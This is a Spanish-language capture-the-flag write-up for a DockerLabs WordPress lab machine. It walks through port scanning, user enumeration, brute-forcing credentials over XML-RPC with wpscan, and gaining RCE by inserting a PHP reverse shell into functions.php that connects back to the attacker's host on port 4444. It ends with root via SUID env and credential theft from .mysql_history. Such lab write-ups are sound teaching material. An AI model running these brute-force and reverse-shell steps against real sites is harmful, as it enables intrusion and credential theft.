# 🖥️ WordPress - DockerLabs

> **Dificultad:** Beginner  
> **OS:** Debian  
> **IP:** 172.17.0.2  
> **Fecha:** 2026-04-10

---

## 📡 Reconocimiento

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vv -Pn 172.17.0.2
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 80/tcp | HTTP | Apache 2.4.57 (Debian) |

- Página por defecto de Apache → WordPress en subdirectorio

---

## 🌐 Enumeración Web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Resultado:** `/wordpress/` (301)

### Enumeración de usuarios WordPress

```
# Método 1 - Author ID
http://172.17.0.2/wordpress/?author=1   → redirige a /author/mario/

# Método 2 - API REST
http://172.17.0.2/wordpress/wp-json/wp/v2/users

# Método 3 - WPScan (automático)
wpscan --url http://172.17.0.2/wordpress/ --enumerate u
```

**Usuario encontrado:** `mario`

### WPScan completo

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,p,t
```

**Hallazgos relevantes:**
- XML-RPC habilitado → `http://172.17.0.2/wordpress/xmlrpc.php`
- Upload directory listing → `http://172.17.0.2/wordpress/wp-content/uploads/`
- WordPress 6.9.4
- Tema activo: `twentytwentytwo` v1.6
- Sin plugins instalados

---

## 🔓 Fuerza Bruta — Credenciales

```bash
wpscan --url http://172.17.0.2/wordpress/ -U mario -P /usr/share/wordlists/rockyou.txt
```

**Credenciales encontradas:**
```
mario / love
```

> ⚡ Encontradas en ~390 intentos via XML-RPC en 4 segundos

---

## 💣 Reverse Shell — RCE via Theme Editor

Login en `http://172.17.0.2/wordpress/wp-login.php`

**Método 1 (nuestro):** Appearance → Theme File Editor → `functions.php` → añadir al final:

```php
function reverse_shell() {
    $sock = fsockopen("172.17.0.1", 4444, $errno, $errstr, 30);
    if (!$sock) return;
    $descriptorspec = array(0 => $sock, 1 => $sock, 2 => $sock);
    $process = proc_open('/bin/bash', $descriptorspec, $pipes);
    proc_close($process);
}
add_action('init', 'reverse_shell');
```

**Método 2 (alternativo):** Appearance → Theme File Editor → `index.php` → sustituir con [PentestMonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)

```bash
# Ponerse a escuchar
nc -lvnp 4444

# Recargar cualquier página del WordPress para activar
```

**Acceso conseguido como:** `www-data`

---

## ⬆️ Escalada de Privilegios — SUID /usr/bin/env

```bash
find / -perm -4000 -user root 2>/dev/null
```

**SUID encontrado:** `/usr/bin/env`

```bash
/usr/bin/env /bin/bash -p
whoami  # root
```

> Ver [GTFOBins - env](https://gtfobins.github.io/gtfobins/env/#suid)

---

## 🔍 Post-Explotación

```bash
cat /root/.mysql_history
```

**Credenciales DB encontradas:**
```
wordpressuser / t9sH76gpQ82UFeZ3GXZS
```

> Esta máquina no tiene flag.txt — el objetivo es llegar a root

---

## 📝 Lecciones aprendidas

- ⭐ **XML-RPC** habilitado = vector de fuerza bruta muy rápido (evita rate limiting del login normal)
- **`?author=1`** enumera usuarios sin herramientas
- **Theme Editor** en WordPress admin = RCE directo si tienes credenciales de admin
- **`/usr/bin/env` con SUID** = escalada trivial a root (GTFOBins)
- Las contraseñas en `.mysql_history` quedan expuestas en texto plano
- `functions.php` es más quirúrgico que sustituir `index.php` entero con la shell
